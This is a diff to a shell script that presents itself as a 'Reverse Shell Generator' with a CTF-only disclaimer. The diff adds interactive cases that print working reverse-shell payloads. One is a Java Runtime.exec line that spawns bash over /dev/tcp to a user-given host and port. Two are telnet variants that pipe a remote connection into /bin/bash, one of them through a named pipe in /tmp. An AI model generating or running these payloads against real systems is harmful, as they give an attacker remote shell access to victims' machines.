@@ -7,7 +7,7 @@ echo "DISCLAIMER: This tool is developed only for legal purposes, such as CTFs. 
 echo "##### Reverse Shell Generator v1.0 #####\n\n"
 
 echo "Select the shell type you want to generate. Here are the types currently supported:"
-echo "\n### Bash, Python/3, PHP, Perl, Ruby, Netcat, Java, XTerm, Telnet, Gawk ###"
+echo "\n### Bash, Python/3, PHP, Perl, Ruby, Netcat, Java, Telnet, Gawk ###"
 
 generateShell () {
 	echo "\nJust select one of them and let the magic happen: "; read type
@@ -17,6 +17,9 @@ generateShell () {
 	hold_i='i' # hold i char
 	hold_p='p' # hold p char
 	hold_tcp='tcp' # hold tcp string
+	hold_line='line' # hold line string
+	bsh='\' # hold backslash
+	exec='exec' # hold exec string
 
 	case $type in
 		bash | BASH | bASH | Bash) 				# check if it's Bash
@@ -202,21 +205,70 @@ generateShell () {
 				done 
 				;;
 			esac
-		}
-		
-		checkAnswer
+		}; checkAnswer
 		;;
 		
 		java | JAVA | jAVA | Java)		# check if it's Java
-		echo "You have selected Java!"
-		;;
+		echo "\nAlright, you have selected Java."
+		echo "Enter LHOST: "; read LHOST
+		echo "Enter LPORT: "; read LPORT
+		echo "One last thing. Just tell me whether you want it to be outputted as text on terminal or saved as a file? (text/file):"; read answer
 		
-		xterm | XTERM | xTERM | Xterm)		# check if it's XTerm
-		echo "You have selected xterm!"
+		case $answer in
+			text | TEXT)
+			echo "\nThere you go buddy:"
+			echo "\nr = Runtime.getRuntime()"
+			echo "p = r.exec([$dqt/bin/bash$dqt,$dqt-c$dqt,$dqt$exec 5<>/dev/tcp/$LHOST/$LPORT;cat <&5 | while read line; do $bsh$dsg$hold_line 2>&5 >&5; done$dqt] as String[])"
+			echo "p.waitFor()"			
+			;;
+			
+			file | FILE)
+			echo "Enter output file name: (without '.java')"; read outputName
+			echo "\nThere you go buddy, your file is saved as "$outputName.java" in your current directory. ($PWD)"
+			echo "\nr = Runtime.getRuntime()" > $outputName.java
+			echo "p = r.exec([$dqt/bin/bash$dqt,$dqt-c$dqt,$dqt$exec 5<>/dev/tcp/$LHOST/$LPORT;cat <&5 | while read line; do $bsh$dsg$hold_line 2>&5 >&5; done$dqt] as String[])" >> $outputName.java
+			echo "p.waitFor()" >> $outputName.java
+			eval ls -la $outputName.java 
+			echo "\nContent of $outputName.java:"
+			eval cat $outputName.java
+			;;
+		esac
 		;;
 		
 		telnet | TELNET | tELNET | Telnet)	# check if it's Telnet
-		echo "You have selected Telnet!"
+		echo "\nAlright, you have selected Telnet."
+		echo "Enter LHOST: "; read LHOST
+		echo "Enter LPORT: "; read LPORT
+		echo "\nHold on. There are a couple of options for this one. Select the type you want from below:"
+		echo "\n\n1 - Do you want it to be in $dqt rm -f /tmp/p; mknod /tmp/p p && telnet <LHOST> <LPORT> 0/tmp/p $dqt format?"
+		echo "2 - Do you want it to be in $dqt telnet <LHOST> <LPORT> | /bin/bash | telnet <LHOST> 443 $dqt format?"
+		echo "\nSeriously, just select 1 or 2:"; read answer
+		
+		checkAnswer() {
+			case $answer in
+				1)
+				echo "\nThere you go buddy:"
+				echo "\nrm -f /tmp/p; mknod /tmp/p p && telnet $LHOST $LPORT 0/tmp/p"
+				;;
+				
+				2)
+				echo "\nThere you go buddy:"
+				echo "\ntelnet $LHOST $LPORT | /bin/bash | telnet $LHOST 443"
+				echo "\n\nATTENTION! Dont forget to listen 443 port on your LHOST=$LHOST for this one ;)"
+				;;
+				
+				*)
+
+				while [  $answer > 2  ]; do
+					echo "Hmm, someone's really curious. Unfortunately, there are no any other types present at the moment. Enter again:"; read answer
+					if [ $answer -le 2 ];then
+						checkAnswer
+						break
+					fi
+				done 
+				;;
+			esac
+		}; checkAnswer
 		;;
 		
 		gawk | GAWK | gAWK | Gawk)		# check if it's Gawk
